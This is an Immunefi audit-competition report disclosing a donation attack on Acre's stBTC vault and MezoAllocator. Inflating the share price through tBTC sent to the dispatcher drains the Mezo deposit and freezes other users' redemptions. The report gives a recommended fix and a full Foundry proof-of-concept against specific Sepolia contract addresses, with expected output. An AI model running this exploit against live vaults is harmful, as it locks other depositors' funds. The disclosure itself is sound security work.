# #34851 \[SC-Low] Adversary can freeze users' fund in stBTC using donation attack on MezoAllocator

**Submitted on Aug 29th 2024 at 13:27:05 UTC by @nnez for** [**Audit Comp | Acre**](https://immunefi.com/audit-competition/boost-acre)

* **Report ID:** #34851
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://sepolia.etherscan.io/address/0x7e184179b1F95A9ca398E6a16127f06b81Cb37a3>
* **Impacts:**
  * Temporary freezing of funds

## Description

## Description

**tBTC** inside **stBTC** contract is allocated to Mezo portal via **dispatcher** contract from time to time by appointed maintainer calling \`allocate()\` function.\
See: <https://github.com/thesis/acre/blob/main/solidity/contracts/MezoAllocator.sol#L190-L219> \`\`\`solidity function allocate() external onlyMaintainer { if (depositBalance > 0) { // Free all Acre's tBTC from MezoPortal before creating a new deposit. // slither-disable-next-line reentrancy-no-eth mezoPortal.withdraw(address(tbtc), depositId); }

```
// Fetch unallocated tBTC from stBTC contract.
uint256 addedAmount &#x3D; tbtc.balanceOf(address(stbtc));
// slither-disable-next-line arbitrary-send-erc20
tbtc.safeTransferFrom(address(stbtc), address(this), addedAmount);

// Create a new deposit in the MezoPortal.
depositBalance &#x3D; uint96(tbtc.balanceOf(address(this)));
tbtc.forceApprove(address(mezoPortal), depositBalance);
// 0 denotes no lock period for this deposit.
mezoPortal.deposit(address(tbtc), depositBalance, 0);
uint256 oldDepositId &#x3D; depositId;
// MezoPortal doesn&#x27;t return depositId, so we have to read depositCounter
// which assigns depositId to the current deposit.
depositId &#x3D; mezoPortal.depositCount();

// slither-disable-next-line reentrancy-events
emit DepositAllocated(
    oldDepositId,
    depositId,
    addedAmount,
    depositBalance
);
```

} \`\`\` Basically, it does the following:

1. The funds are all transferred from **stBTC** and deposit to Mezo portal.
2. The total deposit balance is written in a storage variable, \`depositBalance\`
3. The corresponding depositId is queried from Mezo portal and written in \`depositId\` as it needs this reference id for withdrawal process.

This has the implication that after each allocation, all **tBTC** will be deposited into Mezo portal, therefore, the balance of **tBTC** on **stBTC** contract should amount to zero.

In the opposite side, when users want to redeem their **stBTC** shares for **tBTC**, if the amount of **tBTC** waiting for allocation is insufficient for the redemption, **stBTC** contract calls \`withdraw\` function on dispatcher in order to withdraw **tBTC** from Mezo portal to meet with redemption requirement.

See: <https://github.com/thesis/acre/blob/main/solidity/contracts/MezoAllocator.sol#L190-L219> and\
<https://github.com/thesis/acre/blob/main/solidity/contracts/stBTC.sol#L432C5-L446C6> \`\`\`solidity File: MezoAllocator.sol function withdraw(uint256 amount) external { if (msg.sender != address(stbtc)) revert CallerNotStbtc();

```
emit DepositWithdrawn(depositId, amount);

if (amount &lt; depositBalance) {
    mezoPortal.withdrawPartially(
        address(tbtc),
        depositId,
        uint96(amount)
    );
} else {
    mezoPortal.withdraw(address(tbtc), depositId);
}

// slither-disable-next-line reentrancy-no-eth
depositBalance -&#x3D; uint96(amount);
tbtc.safeTransfer(address(stbtc), amount);
```

}

File: stBTC.sol function withdraw( uint256 assets, address receiver, address owner ) public override returns (uint256) { uint256 currentAssetsBalance = IERC20(asset()).balanceOf(address(this)); // If there is not enough assets in stBTC to cover user withdrawals and // withdrawal fees then pull the assets from the dispatcher. uint256 assetsWithFees = assets + \_feeOnRaw(assets, exitFeeBasisPoints); if (assetsWithFees > currentAssetsBalance) { dispatcher.withdraw(assetsWithFees - currentAssetsBalance); }

```
return super.withdraw(assets, receiver, owner);
```

} \`\`\`

This has the implication that if the deposited amount in Mezo portal is insufficient, the transaction reverts.

totalAssets of **stBTC** comes from three sources:

1. totalDebt
2. balanceOf **tBTC** in **stBTC** contract
3. amount of **tBTC** sent to dispatcher
   1. depositBalance in Mezo portal
   2. balanceOf **tBTC** in dispatcher contract

All of these properties can affect the price per share (PPS) of **stBTC** as PPS is calculated from \`totalAssets / totalSupply\`.

Crucially, balanceOf **tBTC** in dispatcher contract is not used in any fund flows. This creates a situation where attackers can manipulate the share price by donating **tBTC** directly to dispatcher contract. Attacker could attempt to increase his shares value to eat up all the depositBalance in Mezo portal then force a withdrawal from Mezo portal, therefore, effectively transfer all other users' balance to balanceOf **tBTC** in dispatcher contract which is inaccessible.

The following attack scenario should illustrate the issue better.

### Attack scenario

Supposed that **stBTC** is in the state after allocation is called and current \`totalAssets\` is \`1\_000\` and \`totalSupply\` is \`1\_000\` (implies no yield gain yet).\
Therefore, as we explore the funds flow earlier, all **tBTC** balance should already has been deposited to Mezo portal.

That means, \`tBTC.balanceOf(stBTC)\` and \`tBTC.balanceOf(dispatcher)\` should return zero.

1. Attacker deposits \`1\_000 \* 99 = 99\_000\`, and get \`99\_000\` shares back. (Attacker now owns 99% of totalSupply)

\`\`\` totalAssets = 100\_000 totalShares = 100\_000 tBTC.balanceOf(sTBTC) = 99\_000 (attacker's asset) tBTC.balanceOf(dispatcher) = 0 depositBalance (in Mezo) = 1\_000 (from earlier allocation) \`\`\`

2. Attacker transfers **tBTC** directly to **dispatcher** contract to inflate the share price so that attacker's shares worth \`100\_000\` in tokens.

Target share price is \`100\_000/99\_000 = 1.0101010101\`\
The requrie total asset is \`1.0101010101 \* 100\_000 (total share) = 101010.10101\`\
Thus, attacker has to transfer \`101010.10101 - 100\_000 = 1010.10101 -> 1011 (round up)\`

\`\`\` totalAssets = 101\_011 totalShares = 100\_000 tBTC.balanceOf(stBTC) = 99\_000 tBTC.balanceOf(dispatcher) = 1\_011 depositBalance (in Mezo) = 1\_000 \`\`\`

Attacker's shares are now worth \`(101\_011/100\_000)\*99\_000 = 100000.89 -> 100\_000 (round down)\`

3. Attacker redeems all his shares (his shares number is the same, so it passes non-fungible share validation).

Because the total amount of **tBTC** in **stBTC** contract is insufficient for this redemption, the **stBTC** will call **dispatcher** contract to withdraw **tBTC** token from Mezo portal, in this case, it falls short by a \`1\_000\`.

Therefore, all depositBalance will be withdrawn from Mezo portal.\
Attacker gets \`100\_000\` **tBTC** back and loses \`1\_011\` **tBTC** residing in dispatcher.

Attacker's total loss = \`100\_000 - (99\_000+1\_011) = -11\`

As a result of all this, it creates a problem for other users because now the state of the pool would look like this:\
\`\`\` totalAssets = 101\_011 - 100\_000 = 1\_011 totalShares = 100\_000 - 99\_000 = 1\_000 tBTC.balanceOf(stBTC) = 99\_000 - 99\_000 = 0 tBTC.balanceOf(dispatcher) = 1\_011 depositBalance (in Mezo) = 0 \`\`\`

The corresponding assets of other users are effectively transferred to \`dispatcher\` contract.\
However, the redemption or withdrawal flow doesn't utilize that balance to return assets to users.

Therefore, when users try to redeem his/her shares, it will always revert.

Although **dispatcher** contract also implements emergency function, \`releaseDeposit\`\
See: <https://github.com/thesis/acre/blob/main/solidity/contracts/MezoAllocator.sol#L248-L257> \`\`\`solidity function releaseDeposit() external onlyOwner { uint96 amount = mezoPortal .getDeposit(address(this), address(tbtc), depositId) .balance;

```
emit DepositReleased(depositId, amount);
depositBalance &#x3D; 0;
mezoPortal.withdraw(address(tbtc), depositId);
tbtc.safeTransfer(address(stbtc), tbtc.balanceOf(address(this)));
```

} \`\`\` The call to this function would also always revert because the Mezo portal reverts on withdrawing zero amount.\
See: [MezoPortal implementation](https://etherscan.io/address/0xAB13B8eecf5AA2460841d75da5d5D861fD5B8A39#readProxyContract) \`\`\`solidity function withdraw(address token, uint256 depositId) external { ...snipped...

```
if (
    ability &#x3D;&#x3D; TokenAbility.DepositAndLock &amp;&amp;
    // solhint-disable-next-line not-rely-on-time
    block.timestamp &lt; selectedDeposit.unlockAt
) {
    revert DepositLocked(selectedDeposit.unlockAt);
}

if (selectedDeposit.receiptMinted &gt; 0) {
    revert ReceiptNotRepaid(selectedDeposit.receiptMinted);
}

uint96 depositedAmount &#x3D; selectedDeposit.balance;

if (depositedAmount &#x3D;&#x3D; 0) {
    revert DepositNotFound(); &lt;-- revert here
}

...snipped...
```

} \`\`\`

## Impact

Users fund will get stuck. Whether it's permanent or temporary is depending on the upgradability of the contract.

## Rationale for Severity

### Cost analysis

To determine the severity level of this bug, one has to calculate to cost for a successful attack as attacker doesn't gain profit from this exploitation.\
According to Immunefi's guideline, an attack that costs $1 to deal $10 or less in damage is Griefing. (See: <https://immunefisupport.zendesk.com/hc/en-us/articles/17455102268305-When-Is-An-Impactful-Attack-Downgraded-To-Griefing>)

The cost for an attack in the example attack scenario is about 1.1% of TVL (11/1000). However, in real world scenario, Acre has deposit and withdrawal fee which would also incur to attack cost.

For instance, in our attack scenario, attacker would lose another \`100\_000\*0.0025 = 250\` and it makes the total loss of \`11+250 = 261\`, 26.1% of TVL

I still could not figure out the math of how to optimize the attack cost but so far from fuzzing I found that for a 0.25% fee, if attacker choose to mint and acquire only 95% of totalSupply, the cost could be lower to 10% of the TVL (Shown in PoC).

All in all, I decided to submit this as a \`High\` severity because

1. Although the funds are stuck, it could still be recovered with upgradability so the impact might be only temporary funds freezing.
2. The cost for the attack could be lower in the future given that the logical forward move would be to lower the fee to attract more users.

## Recommended Mitigations

The root cause of this vulnerability is the inclusion of \`tBTC.balanceOf(dispatcher)\` in \`totalAssets\`. Since there is no use of that balance in any fund flows, it should be safe to remove this balance of \`totalAssets\` calculation.

## Proof of Concept

## Proof-of-Concept

The following test demonstrates the aforementioned attack scenario.

* BOB, a bystander, deposits 1\_000e18 **tBTC** into **stBTC** vault.
* Attacker mints a share to acquire 95% of the totalSupply
* Attacker donates the amount required to perform the attack
* Attacker redeems all his shares, the total loss compared to initial TVL is shown in percentage.
* BOB tries to redeem but fail. Owner tries to call emergency function but fail

### Steps

1. Create a new forge project, \`forge init --no-commit --no-git --vscode\`
2. Create a new test file in \`test\` directory
3. Paste the below code in the test file
4. Run \`forge t -vv\` and observe that BOB (bystander) could not reeem his shares and owner can't call emergency function.\
   \`\`\` // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol"; import "forge-std/interfaces/IERC20.sol"; import "forge-std/interfaces/IERC4626.sol";

interface IStBTC{ function mintDebt(uint256 shares, address receiver) external returns(uint); function totalSupply() external view returns(uint); function totalAssets() external view returns(uint); function deposit( uint256 assets, address receiver ) external returns(uint); function updateExitFeeBasisPoints( uint256 newExitFeeBasisPoints ) external; function owner() external view returns(address); }

interface IAllocater{ function allocate() external; function releaseDeposit() external; function depositBalance() external view returns(uint); }

contract AcreBoostTest is Test {

```
error DepositNotFound();

function setUp() public {
    vm.selectFork(
        vm.createFork(&quot;https://rpc.sepolia.org&quot;, 6593446)
    );
}

address stBTC &#x3D; 0x7e184179b1F95A9ca398E6a16127f06b81Cb37a3;
address tBTC &#x3D; 0x517f2982701695D4E52f1ECFBEf3ba31Df470161;
address dispatcher &#x3D; 0xd5EbDD6fF384a465D56562D3a489c8CCE1B92dd0;
address maintainer &#x3D; 0x5CD05b073Ed2d01991A46cd55dA5D10a63B1E2CA;
address owner &#x3D; 0x2d154A5c7cE9939274b89bbCe9f5B069E57b09A8;

address bob &#x3D; makeAddr(&quot;bob&quot;);

function testFuzzPoC(/*uint portion*/) public{
  // vm.assume(portion &lt; 100 &amp;&amp; portion &gt; 20);
  uint portion &#x3D; 95;

  // address ownerOf &#x3D; IStBTC(stBTC).owner();
  // vm.prank(ownerOf);
  // IStBTC(stBTC).updateExitFeeBasisPoints(0);
  
  /**
  Bystander user, BOB casually deposits his tBTC into stBTC vault
  */
  deal(tBTC, bob, 1000e18);
  vm.startPrank(bob);
  IERC20(tBTC).approve(stBTC, type(uint).max);
  IStBTC(stBTC).deposit(1000e18, bob);
  uint bobShares &#x3D; IERC20(stBTC).balanceOf(bob);
  vm.stopPrank();

  /**
  Maintainer calls allocate() to allocate tBTC into Mezo portal
  */
  vm.prank(maintainer);
  IAllocater(dispatcher).allocate();
  console.log(&quot;@&gt; Maintainer calls allocate()&quot;);
  console.log(&quot;--- --- ---&quot;);
  console.log(&quot;@&gt; tBTC in stBTC: %s&quot;, IERC20(tBTC).balanceOf(stBTC));
  console.log(&quot;@&gt; tBTC in disptacher: %s&quot;, IERC20(tBTC).balanceOf(dispatcher));
  console.log(&quot;@&gt; dispatcher depositBalance: %s&quot;, IAllocater(dispatcher).depositBalance());
  console.log(&quot;--- --- ---&quot;);

  uint initialTVL &#x3D; IAllocater(dispatcher).depositBalance();
  uint currentTotalSupply &#x3D; IStBTC(stBTC).totalSupply();
  uint currentTotalAsset &#x3D; IStBTC(stBTC).totalAssets();
  uint pps &#x3D; currentTotalAsset / currentTotalSupply;
  uint requiredSupply &#x3D; currentTotalSupply * portion / (100-portion);

  /** 
  Attacker mints 99 * totalSupply * to acquire 99% of totalSupply
  */
  console.log(&quot;@&gt; Attacker mints to acquire %s% of totalSupply&quot;, portion);
  
  deal(tBTC, address(this), requiredSupply*pps);
  uint attackerInitialCapital &#x3D; IERC20(tBTC).balanceOf(address(this));
  IERC20(tBTC).approve(stBTC, type(uint).max);
  IERC4626(stBTC).mint(requiredSupply, address(this));
  uint myShares &#x3D; IERC20(stBTC).balanceOf(address(this));

  console.log(&quot;--- --- ---&quot;);
  console.log(&quot;@&gt; tBTC in stBTC: %s&quot;, IERC20(tBTC).balanceOf(stBTC));
  console.log(&quot;@&gt; tBTC in disptacher: %s&quot;, IERC20(tBTC).balanceOf(dispatcher));
  console.log(&quot;@&gt; dispatcher depositBalance: %s&quot;, IAllocater(dispatcher).depositBalance());
  console.log(&quot;--- --- ---&quot;);


  /**
  Attacker inflates his shares so that it eat up all depositBalance in Mezo portal
  targetSharePrice &#x3D; expectedValue / attackerShares
  targetAsset &#x3D; targetSharePrice * totalSupply
  requiredDonation &#x3D; targetAsset - totalAsset
  +1 because convertToAssets round down
  */
  uint assetInPortal &#x3D; IAllocater(dispatcher).depositBalance();
  currentTotalSupply &#x3D; IStBTC(stBTC).totalSupply();
  currentTotalAsset &#x3D; IStBTC(stBTC).totalAssets();

  console.log(&quot;@&gt; Attacker owns: %16e% of totalSupply&quot;, myShares*1e18/currentTotalSupply );

  uint whatIWant &#x3D; myShares*pps + assetInPortal;
  uint requiredDonation &#x3D; ((whatIWant*currentTotalSupply)/myShares) - currentTotalAsset + 1;
  
  console.log(&quot;@&gt; Attacker inflates his shares so that it eat up all depositBalance in Mezo portal&quot;);
  console.log(&quot;@&gt; Required donation: %s&quot;, requiredDonation);
  deal(tBTC, address(this), requiredDonation);
  IERC20(tBTC).transfer(dispatcher, requiredDonation);

  attackerInitialCapital +&#x3D; requiredDonation;

  console.log(&quot;@&gt; Attacker&#x27;s shares now worth: %s&quot;, IERC4626(stBTC).convertToAssets(myShares));

  console.log(&quot;--- --- ---&quot;);
  console.log(&quot;@&gt; tBTC in stBTC: %s&quot;, IERC20(tBTC).balanceOf(stBTC));
  console.log(&quot;@&gt; tBTC in disptacher: %s&quot;, IERC20(tBTC).balanceOf(dispatcher));
  console.log(&quot;@&gt; dispatcher depositBalance: %s&quot;, IAllocater(dispatcher).depositBalance());
  console.log(&quot;--- --- ---&quot;);

  assertEq(IERC4626(stBTC).convertToAssets(myShares), IAllocater(dispatcher).depositBalance()+IERC20(tBTC).balanceOf(stBTC));
  console.log(&quot;@&gt; Assert that when redeeming, attacker owed assets would eat up all tBTC in stBTC contract and depositBalance in Mezo portal&quot;);

  /**
  Attacker redeems all his shares
  */
  IERC4626(stBTC).redeem(myShares, address(this), address(this));

  uint attackerFinalBalance &#x3D; IERC20(tBTC).balanceOf(address(this));
  console.log(&quot;@&gt; Attacker&#x27;s initial capital: %s&quot;, attackerInitialCapital);
  console.log(&quot;@&gt; Attacker&#x27;s final balance: %s&quot;, attackerFinalBalance);
  console.log(&quot;@&gt; Total loss: %s&quot;, attackerInitialCapital-attackerFinalBalance);
  console.log(&quot;@&gt; Cost per TVL: %18e&quot;, (attackerInitialCapital-attackerFinalBalance)*1e18/initialTVL);
  

  console.log(&quot;--- --- ---&quot;);
  console.log(&quot;@&gt; tBTC in stBTC: %s&quot;, IERC20(tBTC).balanceOf(stBTC));
  console.log(&quot;@&gt; tBTC in disptacher: %s&quot;, IERC20(tBTC).balanceOf(dispatcher));
  console.log(&quot;@&gt; dispatcher depositBalance: %s&quot;, IAllocater(dispatcher).depositBalance());
  console.log(&quot;--- --- ---&quot;);

  /**
  BOB tries to redeem his shares back, but fail because there is insufficient accessible balance
  */

  console.log(&quot;@&gt; BOB tries to redeem his shares&quot;);
  vm.startPrank(bob);
  console.log(&quot;@&gt; Expect revert...&quot;);
  vm.expectRevert();
  IERC4626(stBTC).redeem(bobShares, bob, bob);
  vm.stopPrank();
  console.log(&quot;@&gt; BOB failed to redeem his shares&quot;);

  console.log(&quot;@&gt; Owner tries to call emergency function&quot;);
  vm.startPrank(owner);
  console.log(&quot;@&gt; Expect revert DepositNotFound&quot;);
  vm.expectRevert(DepositNotFound.selector);
  IAllocater(dispatcher).releaseDeposit();
  vm.stopPrank();
  console.log(&quot;@&gt; Owner failed to call emergency function from Mezo portal withdrawal&quot;);

  /**
  Remove the comment below and the first line in this function, and use portion as an argument of testFuzzPoC in order to fuzz this test and find the optimal value of totalSupply needed
  */
  // if ((attackerInitialCapital-attackerFinalBalance)*1e18/initialTVL &lt; 0.11e18) revert();
}
```

} \`\`\`

Expected Result:\
\`\`\` Ran 1 test for test/Counter.t.sol:AcreBoostTest \[PASS] testFuzzPoC() (gas: 901851) Logs: @> Maintainer calls allocate()

***

@> tBTC in stBTC: 0 @> tBTC in disptacher: 0 @> dispatcher depositBalance: 1002104435351260000000

***

@> Attacker mints to acquire 95% of totalSupply

***

@> tBTC in stBTC: 19083940916090104046548 @> tBTC in disptacher: 0 @> dispatcher depositBalance: 1002104435351260000000

***

@> Attacker owns: 95% of totalSupply @> Attacker inflates his shares so that it eat up all depositBalance in Mezo portal @> Required donation: 1054846774053957894737 @> Attacker's shares now worth: 20086045351441364046548

***

@> tBTC in stBTC: 19083940916090104046548 @> tBTC in disptacher: 1054846774053957894737 @> dispatcher depositBalance: 1002104435351260000000

***

@> Assert that when redeeming, attacker owed assets would eat up all tBTC in stBTC contract and depositBalance in Mezo portal @> Attacker's initial capital: 20138787690144061941285 @> Attacker's final balance: 20035955462784403038950 @> Total loss: 102832227359658902335 @> Cost per TVL: 0.102616278036544073

***

@> tBTC in stBTC: 0 @> tBTC in disptacher: 1054846774053957894737 @> dispatcher depositBalance: 0

***

@> BOB tries to redeem his shares @> Expect revert... @> BOB failed to redeem his shares @> Owner tries to call emergency function @> Expect revert DepositNotFound @> Owner failed to call emergency function from Mezo portal withdrawal \`\`\`
